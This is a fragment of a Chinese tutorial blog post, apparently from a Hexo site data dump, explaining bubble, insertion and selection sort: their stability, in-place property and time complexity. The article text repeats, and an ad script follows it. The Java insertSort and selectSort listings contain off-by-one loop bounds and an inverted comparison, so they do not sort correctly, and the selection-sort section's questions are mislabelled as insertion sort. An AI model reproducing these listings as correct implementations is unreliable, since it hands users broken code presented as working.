class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在同样有三个问题。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。</p>\n<p><strong>第二、插入排序是稳定的排序算法吗？</strong></p>\n<p>在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。</p>\n<p><strong>第三、插入排序的时间复杂度是多少？</strong></p>\n<p>如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是<strong>从尾到头遍历已经有序的数据</strong>。</p>\n<p>如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。</p>\n<p>还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h3></div><br></div>\n\n<p>选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/选择排序过程.jpg\">\n<p>同样，也有三个问题需要你思考。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。</p>\n<p><strong>第二、插入排序的时间复杂度是多少？</strong></p>\n<p>选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。</p>\n<p><strong>第三、插入排序是稳定的排序算法吗？</strong></p>\n<p>答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。</p>\n<p>比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">selectSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i+<span class=\"number\">1</span>; j&lt;n-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        \t<span class=\"keyword\">if</span>(a[j]&lt;a[i])&#123;</span><br><span class=\"line\">        \t\t<span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">        \t\ta[j] = a[i];</span><br><span class=\"line\">        \t\ta[i] = temp;</span><br><span class=\"line\">        \t&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？</p>\n<p>我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。</p>\n<p>但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序中的数据交换操作</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">    a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">    flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 插入排序中数据移动操作</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(a[j]&lt;val)&#123;</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。</p>\n<p>所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。</p>\n<table>\n<thead>\n<tr>\n<th>排序算法</th>\n<th>是否原地排序</th>\n<th>是否稳定</th>\n<th>最好</th>\n<th>最坏</th>\n<th>平均</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>冒泡排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>插入排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>选择排序</td>\n<td>√</td>\n<td>×</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n</tbody>\n</table>\n<p>这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。</p>\n<p>今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n*logn)$的排序算法。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。</p>\n<p>排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>排序算法</th>\n<th>时间复杂度</th>\n<th>是否基于比较</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>上</td>\n<td>冒泡、插入、选择</td>\n<td>$ O(n^2) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>中</td>\n<td>快排、归并</td>\n<td>$ O(nlogN) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>下</td>\n<td>桶、计数、基数</td>\n<td>$ O(n) $</td>\n<td>×</td>\n</tr>\n</tbody>\n</table>\n<p>带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\"><strong>插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？</strong></font></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何分析一个排序算法\"><a href=\"#如何分析一个排序算法\" class=\"headerlink\" title=\"如何分析一个排序算法\"></a>如何分析一个排序算法</h3></div><br></div>\n\n<p>学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。<strong>那么要分析一个排序算法，要从哪几方面入手呢？</strong></p>\n<h4 id=\"一、-算法的执行效率\"><a href=\"#一、-算法的执行效率\" class=\"headerlink\" title=\"一、 算法的执行效率\"></a>一、 算法的执行效率</h4><p>对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：</p>\n<p><strong>1、最好情况、最坏情况、平均情况时间复杂度</strong></p>\n<p>我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。</p>\n<p>为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。</p>\n<p><strong>2、时间复杂度的系数、常数、低阶</strong></p>\n<p>我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。</p>\n<p><strong>3、比较次数和交换次数</strong></p>\n<p>这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。</p>\n<h4 id=\"二、-算法的内存消耗\"><a href=\"#二、-算法的内存消耗\" class=\"headerlink\" title=\"二、 算法的内存消耗\"></a>二、 算法的内存消耗</h4><p>前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，<strong>原地排序</strong>。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。</p>\n<h4 id=\"三、-排序算法的稳定性\"><a href=\"#三、-排序算法的稳定性\" class=\"headerlink\" title=\"三、 排序算法的稳定性\"></a>三、 排序算法的稳定性</h4><p>仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，<strong>稳定性</strong>。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。</p>\n<p>我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。</p>\n<p>这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做<strong>稳定的排序算法</strong>；如果前后顺序发生变化，那对应的排序算法就叫做<strong>不稳定的排序算法</strong>。</p>\n<p>你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？</p>\n<p>很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。</p>\n<p>比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？</p>\n<p>最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。</p>\n<p>但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？</p>\n<p><strong>稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变</strong>。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h3></div><br></div>\n\n<p>我们从冒泡排序开始，学习今天的三种排序算法。</p>\n<p>冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。</p>\n<p>我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序第一次过程.png\">\n<p>可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序过程.jpg\">\n<p>实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>是否有数据交换</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>3，5，4，1，2，6</td>\n<td>-</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>3，4，1，2，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>3，1，2，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>无，结束排序操作</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序 a表示需要排序的数组 n表示数组的大小</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bubbleSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a,<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> flag = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;n-<span class=\"number\">1</span>-i;j++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">                a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">                a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">                flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!flag) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在结合上面分析算法的三个方面，有三个问题要问你。</p>\n<p><strong>第一、冒泡排序是原地排序算法吗？</strong></p>\n<p>冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。</p>\n<p><strong>第二、冒泡排序是稳定的排序算法吗？</strong></p>\n<p>在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。</p>\n<p><strong>第三、冒泡排序的时间复杂度是多少？</strong></p>\n<p>最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。</p>\n<p>最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。</p>\n<p>对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过<strong>有序度</strong>和<strong>逆序度</strong>这两个概念来分析。</p>\n<p>有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] &lt;= a[j], 如果i &lt; j$。</p>\n<p>2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)</p>\n<p>同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做<strong>满有序度</strong>。</p>\n<p>逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] &gt; a[j], 如果i &lt; j$。</p>\n<p>关于这三个概念，我们可以得到一个公式：<strong>逆序度 = 满有序度 - 有序度</strong>。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。</p>\n<p>我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>有序度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>4，5，6，3，2，1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>4，5，3，2，1，6</td>\n<td>6</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>4，3，2，1，5，6</td>\n<td>9</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>3，2，1，4，5，6</td>\n<td>12</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>2，1，3，4，5，6</td>\n<td>14</td>\n</tr>\n<tr>\n<td>第五次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>15</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序包含两个原子操作，<strong>比较</strong>和<strong>交换</strong>。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为<strong>逆序度，也就是n*(n-1)/2 - 初始有序度</strong>。此例中就是15-3=12，也就是要进行12次交换操作。</p>\n<p>对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。</p>\n<p>换句话说，平均情况下需要n*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。</p>\n<p>这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h3></div><br></div>\n\n<p>我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。</p>\n<p>这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。</p>\n<p>那插入排序是如何借助上面的思想来实现排序的呢？</p>\n<p>首先，我们将数组中的数据分为两个区间，<strong>已排序区间</strong>和<strong>未排序区间</strong>。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。</p>\n<p>如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序过程.jpg\">\n<p>插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。</p>\n<p>对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。</p>\n<p>为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序移动次数.jpg\">\n<p>插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">insertSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n&lt;=<span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> val = a[i];</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> j=i-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(;j&gt;<span class=\"number\">0</span>;j--)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[j]&lt;val)&#123;</span><br><span class=\"line\">\t\t\t\ta[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ta[j+<span class=\"number\">1</span>] = val;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在同样有三个问题。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。</p>\n<p><strong>第二、插入排序是稳定的排序算法吗？</strong></p>\n<p>在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。</p>\n<p><strong>第三、插入排序的时间复杂度是多少？</strong></p>\n<p>如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是<strong>从尾到头遍历已经有序的数据</strong>。</p>\n<p>如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。</p>\n<p>还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h3></div><br></div>\n\n<p>选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。</p>\n<img 